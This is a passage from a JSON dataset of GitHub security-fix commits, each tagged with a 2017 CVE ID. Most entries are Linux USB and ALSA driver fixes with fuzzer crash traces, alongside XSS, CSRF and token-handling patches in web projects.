    "url": "https://github.com/punkave/sanitize-html/commit/5d205a1005ba0df80e21d8c64a15bb3accdb2403",
    "title": "Fixed XSS attack vector via textarea tags (when explicitly allowed)…",
    "body": "…. Decided that `script` (obviously) and `style` (due to its own XSS vectors) cannot realistically be afforded any XSS protection if allowed, unless we add a full CSS parser. Thanks again to Andrew Krasichkov.",
    "cveIds": [
      "CVE-2017-16016"
    ],
    "cveIdsCount": 1
  },
  "46fccca1fe494f4b74a9800eab9215e3dff7441070736663d6765697bfebed5e": {
    "url": "https://github.com/octobercms/october/commit/4a6e0e1e0e2c3facebc17e0db38c5b4d4cb05bd0",
    "title": "Implement CSRF token by default",
    "body": "Implement CSRF protection on CMS for postback handling",
    "cveIds": [
      "CVE-2017-16244"
    ],
    "cveIdsCount": 1
  },
  "aa1d072c9c57780f41b32d96edc6e590002bb1d0bd4a92412bc3794c9a4a3da0": {
    "url": "https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d",
    "title": "Database: Restore numbered placeholders in wpdb::prepare().",
    "body": "[41496] removed support for numbered placeholders in queries send through `wpdb::prepare()`, which, despite being undocumented, were quite commonly used.This change restores support for numbered placeholders (as well as a subset of placeholder formatting), while also adding extra checks to ensure the correct number of arguments are being passed to `wpdb::prepare()`, given the number of placeholders.See #41925.Built from https://develop.svn.wordpress.org/trunk@42056git-svn-id: http://core.svn.wordpress.org/trunk@41885 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-16510"
    ],
    "cveIdsCount": 1
  },
  "0b368fa712da2551f1d06fbef452a6fcf179203ad0ba18bc860562cd6e1da99a": {
    "url": "https://github.com/torvalds/linux/commit/bd998c2e0df0469707503023d50d46cf0b10c787",
    "title": "USB: serial: console: fix use-after-free on disconnect",
    "body": "A clean-up patch removing two redundant NULL-checks from the consoledisconnect handler inadvertently also removed a third check. This couldlead to the struct usb_serial being prematurely freed by the consolecode when a driver accepts but does not register any ports for aninterface which also lacks endpoint descriptors.Fixes: 0e517c9 (\"USB: serial: console: clean up sanity checks\")Cc: stable <stable@vger.kernel.org> # 4.11Reported-by: Andrey Konovalov <andreyknvl@google.com>Acked-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>Signed-off-by: Johan Hovold <johan@kernel.org>",
    "cveIds": [
      "CVE-2017-16525"
    ],
    "cveIdsCount": 1
  },
  "f5d94401c923f3a671d2b2ff7367d26417b602ff48fa423967e687961d0af5c3": {
    "url": "https://github.com/torvalds/linux/commit/299d7572e46f98534033a9e65973f13ad1ce9047",
    "title": "USB: serial: console: fix use-after-free after failed setup",
    "body": "Make sure to reset the USB-console port pointer when console setup failsin order to avoid having the struct usb_serial be prematurely freed bythe console code when the device is later disconnected.Fixes: 73e487f (\"[PATCH] USB console: fix disconnection issues\")Cc: stable <stable@vger.kernel.org># 2.6.18Acked-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>Signed-off-by: Johan Hovold <johan@kernel.org>",
    "cveIds": [
      "CVE-2017-16525"
    ],
    "cveIdsCount": 1
  },
  "d9f5503e8794149c10bed3694505a0d40f28f20e27890aa028b4abccd8ecd316": {
    "url": "https://github.com/torvalds/linux/commit/bbf26183b7a6236ba602f4d6a2f7cade35bba043",
    "title": "uwb: properly check kthread_run return value",
    "body": "uwbd_start() calls kthread_run() and checks that the return value isnot NULL. But the return value is not NULL in case kthread_run() fails,it takes the form of ERR_PTR(-EINTR).Use IS_ERR() instead.Also add a check to uwbd_stop().Signed-off-by: Andrey Konovalov <andreyknvl@google.com>Cc: stable <stable@vger.kernel.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2017-16526"
    ],
    "cveIdsCount": 1
  },
  "23af2e5b5addfeb2fff75f7d23a298059863f1d303042667c581d5b6fc13f439": {
    "url": "https://github.com/torvalds/linux/commit/124751d5e63c823092060074bd0abaae61aaa9c4",
    "title": "ALSA: usb-audio: Kill stray URB at exiting",
    "body": "USB-audio driver may leave a stray URB for the mixer interrupt when itexits by some error during probe. This leads to a use-after-freeerror as spotted by syzkaller like: ================================================================== BUG: KASAN: use-after-free in snd_usb_mixer_interrupt+0x604/0x6f0 Call Trace: <IRQ> __dump_stack lib/dump_stack.c:16 dump_stack+0x292/0x395 lib/dump_stack.c:52 print_address_description+0x78/0x280 mm/kasan/report.c:252 kasan_report_error mm/kasan/report.c:351 kasan_report+0x23d/0x350 mm/kasan/report.c:409 __asan_report_load8_noabort+0x19/0x20 mm/kasan/report.c:430 snd_usb_mixer_interrupt+0x604/0x6f0 sound/usb/mixer.c:2490 __usb_hcd_giveback_urb+0x2e0/0x650 drivers/usb/core/hcd.c:1779 .... Allocated by task 1484: save_stack_trace+0x1b/0x20 arch/x86/kernel/stacktrace.c:59 save_stack+0x43/0xd0 mm/kasan/kasan.c:447 set_track mm/kasan/kasan.c:459 kasan_kmalloc+0xad/0xe0 mm/kasan/kasan.c:551 kmem_cache_alloc_trace+0x11e/0x2d0 mm/slub.c:2772 kmalloc ./include/linux/slab.h:493 kzalloc ./include/linux/slab.h:666 snd_usb_create_mixer+0x145/0x1010 sound/usb/mixer.c:2540 create_standard_mixer_quirk+0x58/0x80 sound/usb/quirks.c:516 snd_usb_create_quirk+0x92/0x100 sound/usb/quirks.c:560 create_composite_quirk+0x1c4/0x3e0 sound/usb/quirks.c:59 snd_usb_create_quirk+0x92/0x100 sound/usb/quirks.c:560 usb_audio_probe+0x1040/0x2c10 sound/usb/card.c:618 .... Freed by task 1484: save_stack_trace+0x1b/0x20 arch/x86/kernel/stacktrace.c:59 save_stack+0x43/0xd0 mm/kasan/kasan.c:447 set_track mm/kasan/kasan.c:459 kasan_slab_free+0x72/0xc0 mm/kasan/kasan.c:524 slab_free_hook mm/slub.c:1390 slab_free_freelist_hook mm/slub.c:1412 slab_free mm/slub.c:2988 kfree+0xf6/0x2f0 mm/slub.c:3919 snd_usb_mixer_free+0x11a/0x160 sound/usb/mixer.c:2244 snd_usb_mixer_dev_free+0x36/0x50 sound/usb/mixer.c:2250 __snd_device_free+0x1ff/0x380 sound/core/device.c:91 snd_device_free_all+0x8f/0xe0 sound/core/device.c:244 snd_card_do_free sound/core/init.c:461 release_card_device+0x47/0x170 sound/core/init.c:181 device_release+0x13f/0x210 drivers/base/core.c:814 ....Actually such a URB is killed properly at disconnection when thedevice gets probed successfully, and what we need is to apply it forthe error-path, too.In this patch, we apply snd_usb_mixer_disconnect() at releasing.Also introduce a new flag, disconnected, to struct usb_mixer_interfacefor not performing the disconnection procedure twice.Reported-by: Andrey Konovalov <andreyknvl@google.com>Tested-by: Andrey Konovalov <andreyknvl@google.com>Cc: <stable@vger.kernel.org>Signed-off-by: Takashi Iwai <tiwai@suse.de>",
    "cveIds": [
      "CVE-2017-16527"
    ],
    "cveIdsCount": 1
  },
  "1d94a402a3be498be8a3644b9ad94bb8a7c9ab6a6c5161bcc6df946c6c9aa95b": {
    "url": "https://github.com/torvalds/linux/commit/fc27fe7e8deef2f37cba3f2be2d52b6ca5eb9d57",
    "title": "ALSA: seq: Cancel pending autoload work at unbinding device",
    "body": "ALSA sequencer core has a mechanism to load the enumerated devicesautomatically, and it's performed in an off-load work. This seemscausing some race when a sequencer is removed while the pendingautoload work is running. As syzkaller spotted, it may lead to someuse-after-free: BUG: KASAN: use-after-free in snd_rawmidi_dev_seq_free+0x69/0x70 sound/core/rawmidi.c:1617 Write of size 8 at addr ffff88006c611d90 by task kworker/2:1/567 CPU: 2 PID: 567 Comm: kworker/2:1 Not tainted 4.13.0+ #29 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011 Workqueue: events autoload_drivers Call Trace: __dump_stack lib/dump_stack.c:16 [inline] dump_stack+0x192/0x22c lib/dump_stack.c:52 print_address_description+0x78/0x280 mm/kasan/report.c:252 kasan_report_error mm/kasan/report.c:351 [inline] kasan_report+0x230/0x340 mm/kasan/report.c:409 __asan_report_store8_noabort+0x1c/0x20 mm/kasan/report.c:435 snd_rawmidi_dev_seq_free+0x69/0x70 sound/core/rawmidi.c:1617 snd_seq_dev_release+0x4f/0x70 sound/core/seq_device.c:192 device_release+0x13f/0x210 drivers/base/core.c:814 kobject_cleanup lib/kobject.c:648 [inline] kobject_release lib/kobject.c:677 [inline] kref_put include/linux/kref.h:70 [inline] kobject_put+0x145/0x240 lib/kobject.c:694 put_device+0x25/0x30 drivers/base/core.c:1799 klist_devices_put+0x36/0x40 drivers/base/bus.c:827 klist_next+0x264/0x4a0 lib/klist.c:403 next_device drivers/base/bus.c:270 [inline] bus_for_each_dev+0x17e/0x210 drivers/base/bus.c:312 autoload_drivers+0x3b/0x50 sound/core/seq_device.c:117 process_one_work+0x9fb/0x1570 kernel/workqueue.c:2097 worker_thread+0x1e4/0x1350 kernel/workqueue.c:2231 kthread+0x324/0x3f0 kernel/kthread.c:231 ret_from_fork+0x25/0x30 arch/x86/entry/entry_64.S:425The fix is simply to assure canceling the autoload work at removingthe device.Reported-by: Andrey Konovalov <andreyknvl@google.com>Tested-by: Andrey Konovalov <andreyknvl@google.com>Cc: <stable@vger.kernel.org>Signed-off-by: Takashi Iwai <tiwai@suse.de>",
    "cveIds": [
      "CVE-2017-16528"
    ],
    "cveIdsCount": 1
  },
  "a072d8f6edf92ea018fc2e788f612b5b4e7ac662966c9849d2e3ba1b976a048e": {
    "url": "https://github.com/torvalds/linux/commit/bfc81a8bc18e3c4ba0cbaa7666ff76be2f998991",
    "title": "ALSA: usb-audio: Check out-of-bounds access by corrupted buffer descr…",
    "body": "…iptorWhen a USB-audio device receives a maliciously adjusted or corruptedbuffer descriptor, the USB-audio driver may access an out-of-bouncevalue at its parser. This was detected by syzkaller, something like: BUG: KASAN: slab-out-of-bounds in usb_audio_probe+0x27b2/0x2ab0 Read of size 1 at addr ffff88006b83a9e8 by task kworker/0:1/24 CPU: 0 PID: 24 Comm: kworker/0:1 Not tainted 4.14.0-rc1-42251-gebb2c2437d80 #224 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011 Workqueue: usb_hub_wq hub_event Call Trace: __dump_stack lib/dump_stack.c:16 dump_stack+0x292/0x395 lib/dump_stack.c:52 print_address_description+0x78/0x280 mm/kasan/report.c:252 kasan_report_error mm/kasan/report.c:351 kasan_report+0x22f/0x340 mm/kasan/report.c:409 __asan_report_load1_noabort+0x19/0x20 mm/kasan/report.c:427 snd_usb_create_streams sound/usb/card.c:248 usb_audio_probe+0x27b2/0x2ab0 sound/usb/card.c:605 usb_probe_interface+0x35d/0x8e0 drivers/usb/core/driver.c:361 really_probe drivers/base/dd.c:413 driver_probe_device+0x610/0xa00 drivers/base/dd.c:557 __device_attach_driver+0x230/0x290 drivers/base/dd.c:653 bus_for_each_drv+0x161/0x210 drivers/base/bus.c:463 __device_attach+0x26e/0x3d0 drivers/base/dd.c:710 device_initial_probe+0x1f/0x30 drivers/base/dd.c:757 bus_probe_device+0x1eb/0x290 drivers/base/bus.c:523 device_add+0xd0b/0x1660 drivers/base/core.c:1835 usb_set_configuration+0x104e/0x1870 drivers/usb/core/message.c:1932 generic_probe+0x73/0xe0 drivers/usb/core/generic.c:174 usb_probe_device+0xaf/0xe0 drivers/usb/core/driver.c:266 really_probe drivers/base/dd.c:413 driver_probe_device+0x610/0xa00 drivers/base/dd.c:557 __device_attach_driver+0x230/0x290 drivers/base/dd.c:653 bus_for_each_drv+0x161/0x210 drivers/base/bus.c:463 __device_attach+0x26e/0x3d0 drivers/base/dd.c:710 device_initial_probe+0x1f/0x30 drivers/base/dd.c:757 bus_probe_device+0x1eb/0x290 drivers/base/bus.c:523 device_add+0xd0b/0x1660 drivers/base/core.c:1835 usb_new_device+0x7b8/0x1020 drivers/usb/core/hub.c:2457 hub_port_connect drivers/usb/core/hub.c:4903 hub_port_connect_change drivers/usb/core/hub.c:5009 port_event drivers/usb/core/hub.c:5115 hub_event+0x194d/0x3740 drivers/usb/core/hub.c:5195 process_one_work+0xc7f/0x1db0 kernel/workqueue.c:2119 worker_thread+0x221/0x1850 kernel/workqueue.c:2253 kthread+0x3a1/0x470 kernel/kthread.c:231 ret_from_fork+0x2a/0x40 arch/x86/entry/entry_64.S:431This patch adds the checks of out-of-bounce accesses at appropriateplaces and bails out when it goes out of the given buffer.Reported-by: Andrey Konovalov <andreyknvl@google.com>Tested-by: Andrey Konovalov <andreyknvl@google.com>Cc: <stable@vger.kernel.org>Signed-off-by: Takashi Iwai <tiwai@suse.de>",
    "cveIds": [
      "CVE-2017-16529"
    ],
    "cveIdsCount": 1
  },
  "9cf004ebe0149df7dc78da90770c646b9b75a9c6e0f25a4e55ef76dc5c59ca39": {
    "url": "https://github.com/torvalds/linux/commit/786de92b3cb26012d3d0f00ee37adf14527f35c4",
    "title": "USB: uas: fix bug in handling of alternate settings",
    "body": "The uas driver has a subtle bug in the way it handles alternatesettings. The uas_find_uas_alt_setting() routine returns analtsetting value (the bAlternateSetting number in the descriptor), butuas_use_uas_driver() then treats that value as an index to theintf->altsetting array, which it isn't.Normally this doesn't cause any problems because the variousalternate settings have bAlternateSetting values 0, 1, 2, ..., so thevalue is equal to the index in the array. But this is not guaranteed,and Andrey Konovalov used the syzkaller fuzzer with KASAN to get aslab-out-of-bounds error by violating this assumption.This patch fixes the bug by making uas_find_uas_alt_setting() return apointer to the altsetting entry rather than either the value or theindex. Pointers are less subject to misinterpretation.Signed-off-by: Alan Stern <stern@rowland.harvard.edu>Reported-by: Andrey Konovalov <andreyknvl@google.com>Tested-by: Andrey Konovalov <andreyknvl@google.com>CC: Oliver Neukum <oneukum@suse.com>CC: <stable@vger.kernel.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2017-16530"
    ],
    "cveIdsCount": 1
  },
  "244917f0167ec6864579bd2ff34b9db234b3967eac2b0769c09959dab0245919": {
    "url": "https://github.com/torvalds/linux/commit/bd7a3fe770ebd8391d1c7d072ff88e9e76d063eb",
    "title": "USB: fix out-of-bounds in usb_set_configuration",
    "body": "Andrey Konovalov reported a possible out-of-bounds problem for a USB interfaceassociation descriptor. He writes:It seems there's no proper size check of a USB_DT_INTERFACE_ASSOCIATIONdescriptor. It's only checked that the size is >= 2 inusb_parse_configuration(), so find_iad() might do out-of-bounds accessto intf_assoc->bInterfaceCount.And he's right, we don't check for crazy descriptors of this type very well, soresolve this problem. Yet another issue found by syzkaller...Reported-by: Andrey Konovalov <andreyknvl@google.com>Tested-by: Andrey Konovalov <andreyknvl@google.com>Cc: stable <stable@vger.kernel.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2017-16531"
    ],
    "cveIdsCount": 1
  },
  "6546d3be234edbac4e9a2bf843696cce01e50f3febf669064beec750a3cfbb97": {
    "url": "https://github.com/torvalds/linux/commit/7c80f9e4a588f1925b07134bb2e3689335f6c6d8",
    "title": "usb: usbtest: fix NULL pointer dereference",
    "body": "If the usbtest driver encounters a device with an IN bulk endpoint butno OUT bulk endpoint, it will try to dereference a NULL pointer(out->desc.bEndpointAddress). The problem can be solved by adding amissing test.Signed-off-by: Alan Stern <stern@rowland.harvard.edu>Reported-by: Andrey Konovalov <andreyknvl@google.com>Tested-by: Andrey Konovalov <andreyknvl@google.com>Signed-off-by: Felipe Balbi <felipe.balbi@linux.intel.com>",
    "cveIds": [
      "CVE-2017-16532"
    ],
    "cveIdsCount": 1
  },
  "6af96ad6ebeb534854dc9783228d601efcb35a16b2f015d0ca2e7eb4c15d4f66": {
    "url": "https://github.com/torvalds/linux/commit/f043bfc98c193c284e2cd768fefabe18ac2fed9b",
    "title": "HID: usbhid: fix out-of-bounds bug",
    "body": "The hid descriptor identifies the length and type of subordinatedescriptors for a device. If the received hid descriptor is smaller thanthe size of the struct hid_descriptor, it is possible to causeout-of-bounds.In addition, if bNumDescriptors of the hid descriptor have an incorrectvalue, this can also cause out-of-bounds while approaching hdesc->desc[n].So check the size of hid descriptor and bNumDescriptors.BUG: KASAN: slab-out-of-bounds in usbhid_parse+0x9b1/0xa20Read of size 1 at addr ffff88006c5f8edf by task kworker/1:2/1261CPU: 1 PID: 1261 Comm: kworker/1:2 Not tainted4.14.0-rc1-42251-gebb2c2437d80 #169Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011Workqueue: usb_hub_wq hub_eventCall Trace:__dump_stack lib/dump_stack.c:16dump_stack+0x292/0x395 lib/dump_stack.c:52print_address_description+0x78/0x280 mm/kasan/report.c:252kasan_report_error mm/kasan/report.c:351kasan_report+0x22f/0x340 mm/kasan/report.c:409__asan_report_load1_noabort+0x19/0x20 mm/kasan/report.c:427usbhid_parse+0x9b1/0xa20 drivers/hid/usbhid/hid-core.c:1004hid_add_device+0x16b/0xb30 drivers/hid/hid-core.c:2944usbhid_probe+0xc28/0x1100 drivers/hid/usbhid/hid-core.c:1369usb_probe_interface+0x35d/0x8e0 drivers/usb/core/driver.c:361really_probe drivers/base/dd.c:413driver_probe_device+0x610/0xa00 drivers/base/dd.c:557__device_attach_driver+0x230/0x290 drivers/base/dd.c:653bus_for_each_drv+0x161/0x210 drivers/base/bus.c:463__device_attach+0x26e/0x3d0 drivers/base/dd.c:710device_initial_probe+0x1f/0x30 drivers/base/dd.c:757bus_probe_device+0x1eb/0x290 drivers/base/bus.c:523device_add+0xd0b/0x1660 drivers/base/core.c:1835usb_set_configuration+0x104e/0x1870 drivers/usb/core/message.c:1932generic_probe+0x73/0xe0 drivers/usb/core/generic.c:174usb_probe_device+0xaf/0xe0 drivers/usb/core/driver.c:266really_probe drivers/base/dd.c:413driver_probe_device+0x610/0xa00 drivers/base/dd.c:557__device_attach_driver+0x230/0x290 drivers/base/dd.c:653bus_for_each_drv+0x161/0x210 drivers/base/bus.c:463__device_attach+0x26e/0x3d0 drivers/base/dd.c:710device_initial_probe+0x1f/0x30 drivers/base/dd.c:757bus_probe_device+0x1eb/0x290 drivers/base/bus.c:523device_add+0xd0b/0x1660 drivers/base/core.c:1835usb_new_device+0x7b8/0x1020 drivers/usb/core/hub.c:2457hub_port_connect drivers/usb/core/hub.c:4903hub_port_connect_change drivers/usb/core/hub.c:5009port_event drivers/usb/core/hub.c:5115hub_event+0x194d/0x3740 drivers/usb/core/hub.c:5195process_one_work+0xc7f/0x1db0 kernel/workqueue.c:2119worker_thread+0x221/0x1850 kernel/workqueue.c:2253kthread+0x3a1/0x470 kernel/kthread.c:231ret_from_fork+0x2a/0x40 arch/x86/entry/entry_64.S:431Cc: stable@vger.kernel.orgReported-by: Andrey Konovalov <andreyknvl@google.com>Signed-off-by: Jaejoong Kim <climbbb.kim@gmail.com>Tested-by: Andrey Konovalov <andreyknvl@google.com>Acked-by: Alan Stern <stern@rowland.harvard.edu>Signed-off-by: Jiri Kosina <jkosina@suse.cz>",
    "cveIds": [
      "CVE-2017-16533"
    ],
    "cveIdsCount": 1
  },
  "de0ec2e6316c8ec7d12dc406fcb01dbfe1587f89d797123edea00305f509657e": {
    "url": "https://github.com/torvalds/linux/commit/2e1c42391ff2556387b3cb6308b24f6f65619feb",
    "title": "USB: core: harden cdc_parse_cdc_header",
    "body": "Andrey Konovalov reported a possible out-of-bounds problem for thecdc_parse_cdc_header function. He writes:It looks like cdc_parse_cdc_header() doesn't validate buflenbefore accessing buffer[1], buffer[2] and so on. The only checkpresent is while (buflen > 0).So fix this issue up by properly validating the buffer length matcheswhat the descriptor says it is.Reported-by: Andrey Konovalov <andreyknvl@google.com>Tested-by: Andrey Konovalov <andreyknvl@google.com>Cc: stable <stable@vger.kernel.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2017-16534"
    ],
    "cveIdsCount": 1
  },
  "361d785281f9e9d5a3239457f65ecfd04851cd4fa7fc91da34d8ea1789af2426": {
    "url": "https://github.com/torvalds/linux/commit/1c0edc3633b56000e18d82fc241e3995ca18a69e",
    "title": "USB: core: fix out-of-bounds access bug in usb_get_bos_descriptor()",
    "body": "Andrey used the syzkaller fuzzer to find an out-of-bounds memoryaccess in usb_get_bos_descriptor(). The code wasn't checking that thenext usb_dev_cap_header structure could fit into the remaining bufferspace.This patch fixes the error and also reduces the bNumDeviceCaps fieldin the header to match the actual number of capabilities found, incases where there are fewer than expected.Reported-by: Andrey Konovalov <andreyknvl@google.com>Signed-off-by: Alan Stern <stern@rowland.harvard.edu>Tested-by: Andrey Konovalov <andreyknvl@google.com>CC: <stable@vger.kernel.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2017-16535"
    ],
    "cveIdsCount": 1
  },
  "284b0b2915db83ddf7ad8a467f50b7018f624bf2408deb475cbacb9537ecaf0e": {
    "url": "https://github.com/moby/moby/pull/35399/commits/a21ecdf3c8a343a7c94e4c4d01b178c87ca7aaa1",
    "title": "Add /proc/scsi to masked paths",
    "body": "This is writeable, and can be used to remove devices. Containers donot need to know about scsi devices.Signed-off-by: Justin Cormack <justin.cormack@docker.com>",
    "cveIds": [
      "CVE-2017-16539"
    ],
    "cveIdsCount": 1
  },
  "03ccb3dc17b4b265f78bfb334b6abf73f7afb613cf8bf03887784f56f5b7d0cf": {
    "url": "https://github.com/openstack/swauth/commit/70af7986265a3defea054c46efc82d0698917298",
    "title": "Hash token before storing it in Swift",
    "body": "Swauth uses token value as object name. Object names are logged in proxyand object servers. Anybody with access to proxy/object server logs cansee token values. Attacker can use this token to access user's data inSwift store. Instead of token, hashed token (with HASH_PATH_PREFIX andHASH_PATH_SUFFIX) is used as object name now.WARNING: In deployments without memcached this patch logs out all usersbecause tokens became invalid.CVE-2017-16613SecurityImpactCloses-Bug: #1655781Change-Id: I0d01e8e95400c82ef25f98e2d269532e83233c2c",
    "cveIds": [
      "CVE-2017-16613"
    ],
    "cveIdsCount": 1
  },
  "8611ca4761d36d45400dfd3d85bcd77bae1f24d704990eceb094c63e00d67896": {
    "url": "https://github.com/php/php-src/commit/5c0455bf2c8cd3c25401407f158e820aa3b239e1",
    "title": "Merge branch 'PHP-7.0' into PHP-7.1",
    "body": "* PHP-7.0: Fixed bug #75055 Out-Of-Bounds Read in timelib_meridian() Apply upstream patch for CVE-2016-1283",
    "cveIds": [
      "CVE-2017-16642"
    ],
    "cveIdsCount": 1
  },
  "686adeadff168f8dca78999a50eac79c206540232d1e34af4851e7ae04908a78": {
    "url": "https://github.com/torvalds/linux/commit/a50829479f58416a013a4ccca791336af3c584c7",
    "title": "Input: gtco - fix potential out-of-bound access",
    "body": "parse_hid_report_descriptor() has a while (i < length) loop, whichonly guarantees that there's at least 1 byte in the buffer, but theloop body can read multiple bytes which causes out-of-bounds access.Reported-by: Andrey Konovalov <andreyknvl@google.com>Reviewed-by: Andrey Konovalov <andreyknvl@google.com>Cc: stable@vger.kernel.orgSigned-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>",
    "cveIds": [
      "CVE-2017-16643"
    ],
    "cveIdsCount": 1
  },
  "048275d8068e228f99a3ed494f558fc4d56a7c8ece60fc3fb09744e065b436df": {
    "url": "https://github.com/torvalds/linux/commit/ea04efee7635c9120d015dcdeeeb6988130cb67a",
    "title": "Input: ims-psu - check if CDC union descriptor is sane",
    "body": "Before trying to use CDC union descriptor, try to validate whether that itis sane by checking that intf->altsetting->extra is big enough and thatdescriptor bLength is not too big and not too small.Reported-by: Andrey Konovalov <andreyknvl@google.com>Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>",
    "cveIds": [
      "CVE-2017-16645"
    ],
    "cveIdsCount": 1
  },
  "20ff912a6a794446731dcecc39498d4c5139be329dc2348d613ac8b2ba7c8a28": {
    "url": "https://github.com/librenms/librenms/commit/d3094fa6578b29dc34fb5a7d0bd6deab49ecc911",
    "title": "security: Security Patch to deal with reported vulnerabilties (#7164)",
    "body": "* WIP: Security Patch* Update install.phpStyling fix* Update install.php* Update dbFacile.php* Fix whitespace",
    "cveIds": [
      "CVE-2017-16759"
    ],
    "cveIdsCount": 1
  },
  "0298c917bcea8e2682c55999ae02345b5d7c26750748a27b6c74fde5b5fef796": {
    "url": "https://github.com/librenms/librenms/commit/7887b2e1c7158204ac69ca43beafce66e4d3a3b4",
    "title": "security: Security Patch to deal with reported vulnerabilties (#7164)",
    "body": "* WIP: Security Patch* Update install.phpStyling fix* Update install.php* Update dbFacile.php* Fix whitespace",
    "cveIds": [
      "CVE-2017-16759"
    ],
    "cveIdsCount": 1
  },
  "d91a55f63f10efb34db987d7f5f2765582ff67948b103b4eef9cb0a373e20803": {
    "url": "https://github.com/geminabox/geminabox/commit/f8429a9e364658459add170e4ebc7a5d3b4759e7",
    "title": "Fix CVE-2017-16792 - Stored XSS",
    "body": "Reject Javascript Link",
    "cveIds": [
      "CVE-2017-16792"
    ],
    "cveIdsCount": 1
  },
  "6c90131a7c9c975564a17fc9c750f05d9dd8bce481ab8f78e6061d22ea5b7a69": {
    "url": "https://github.com/MISP/MISP/commit/a659664447a7b2a383cb9e0f6b43dcb43ec69194",
    "title": "fix: Fixed a reflected XSS in the sharing group creator tool",
    "body": "- Fixed a reflected XSS in the sharing group editor that requires malicious organisation names- Low impact due to the following requirements: - organisation names with malicious org names (JS in the orgname) - sharing group editor user has to manually add an organisation to the list that has javascript in the org name - only vulnerable view is the editor itself, so the impact is limited to users that manually add organisations with malicious names to the list themselves / edit such sharing groups- As reported by Dawid Czarnecki",
    "cveIds": [
      "CVE-2017-16802"
    ],
    "cveIdsCount": 1
  },
  "8bc04d5229f6e9720c7048b310ce9f6040ccbc30f157de37f1ee3d7c40a345c2": {
    "url": "https://github.com/libav/libav/commit/cd4663dc80323ba64989d0c103d51ad3ee0e9c2f",
    "title": "smacker: add sanity check for length in smacker_decode_tree()",
    "body": "Signed-off-by: Michael Niedermayer <michaelni@gmx.at>Bug-Id: 1098Cc: libav-stable@libav.orgSigned-off-by: Sean McGovern <gseanmcg@gmail.com>",
    "cveIds": [
      "CVE-2017-16803"
    ],
    "cveIdsCount": 1
  },
  "ec4b3ddf8bf6b627c0324dbc36757cff225dda6c8c3ef8f82f9559b9a5d5a8f7": {
    "url": "https://github.com/redmine/redmine/commit/0f09f161f64f4190a52166675ff380a15b72a8bc",
    "title": "Send reminders about visible issues only (#25713).",
    "body": "Patch by Felix Schäfer.git-svn-id: http://svn.redmine.org/redmine/trunk@16557 e93f8b46-1217-0410-a6f0-8f06a7374b81",
    "cveIds": [
      "CVE-2017-16804"
    ],
    "cveIdsCount": 1
  },
  "d64641dee2ea75c93e333a90953e6dc8f774b1843c6d9991b2fd8905ecea311d": {
    "url": "https://github.com/Ulterius/server/commit/770d1821de43cf1d0a93c79025995bdd812a76ee",
    "title": "Stability patch, fixes broken GPU detection code, updates the websock…",
    "body": "…et framework to be real-time, removes crappy agent spawning system, removes IPC, fixes HTTP server traversal,",
    "cveIds": [
      "CVE-2017-16806"
    ],
    "cveIdsCount": 1
  },
  "aeabdb03fa7c75750f31dc7de4364a257230c102626416f6d6f7741d1a60d1fd": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/94e538aebbc9f9c529e8b1f2eda860cfb8c473b1",
    "title": "vc2enc_dwt: pad the temporary buffer by the slice size",
    "body": "Since non-Haar wavelets need to look into pixels outside the frame, weneed to pad the buffer. The old factor of two seemed to be a workaroundthat fact and only padded to the left and bottom. This correctly padsby the slice size and as such reduces memory usage and potentialexploits.Reported by Liu Bingchang.Ideally, there should be no temporary buffer but the encoder is designedto deinterleave the coefficients into the classical wavelet structurewith the lower frequency values in the top left corner.Signed-off-by: Rostislav Pehlivanov <atomnuker@gmail.com>(cherry picked from commit 3228ac7)",
    "cveIds": [
      "CVE-2017-16840"
    ],
    "cveIdsCount": 1
  },
  "01b5558fd7823b91c600e85efd409eb36fd7b776885dfa9b37b4e11b2da5f8ee": {
    "url": "https://github.com/horde/kronolith/commit/09d90141292f9ec516a7a2007bf828ce2bbdf60d",
    "title": "Bug: 14857",
    "body": "Prevent XSS in event's URL field.",
    "cveIds": [
      "CVE-2017-16906"
    ],
    "cveIdsCount": 1
  },
  "063720c6f3a03e7c0fe8641a8e1fa9a71066b6eb2561fb29bf00adb9c6929d42": {
    "url": "https://github.com/horde/base/commit/fb2113bbcd04bd4a28c46aad0889fb0a3979a230",
    "title": "Bug: 14857",
    "body": "Escape user supplied color data, preventing XSS vuln.",
    "cveIds": [
      "CVE-2017-16907"
    ],
    "cveIdsCount": 1
  },
  "52f8f411a48ae283ea12ad05698ec7e3f4665ad0218df14416ac36f2fb1ff62f": {
    "url": "https://github.com/horde/kronolith/commit/39f740068ad21618f6f70b6e37855c61cadbd716",
    "title": "Bug: 14857",
    "body": "Escape user-provided resource name when outputting. Prevents XSS vuln.",
    "cveIds": [
      "CVE-2017-16908"
    ],
    "cveIdsCount": 1
  },
  "a70ff29ea78ea5e3ad8706de0528e6460cd83cb294227a92c17dc99124930121": {
    "url": "https://github.com/GNOME/libxml2/commit/e26630548e7d138d2c560844c43820b6767251e3",
    "title": "Fix handling of parameter-entity references",
